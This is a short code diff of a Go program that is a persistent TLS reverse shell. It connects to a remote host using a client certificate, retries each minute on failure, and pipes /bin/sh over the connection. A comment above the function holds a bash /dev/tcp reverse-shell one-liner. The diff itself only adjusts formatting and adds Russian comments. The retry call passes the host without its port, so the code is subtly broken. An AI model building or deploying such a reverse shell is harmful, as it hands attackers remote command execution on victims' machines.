@@ -6,9 +6,9 @@ package main
 import (
 	"crypto/tls"
 	"log"
+	"net"
 	"os/exec"
 	"time"
-    "net"
 )
 
 func main() {
@@ -17,8 +17,8 @@ func main() {
 
 // bash -i >& /dev/tcp/localhost/12345 0>&1
 func reverse(hostRaw string) {
-    host, port, err := net.SplitHostPort(hostRaw)
-    
+	host, port, err := net.SplitHostPort(hostRaw)
+
 	// читаем ключ и сертификат
 	cert, err := tls.LoadX509KeyPair("client.pem", "client.key")
 
@@ -34,10 +34,11 @@ func reverse(hostRaw string) {
 		if nil != c {
 			c.Close()
 		}
-		time.Sleep(time.Minute)
+		time.Sleep(time.Minute) // ждем минутку
 		reverse(host)
 	}
 
+	// обработка комманды от сервера
 	cmd := exec.Command("/bin/sh")
 	cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c
 	cmd.Run()
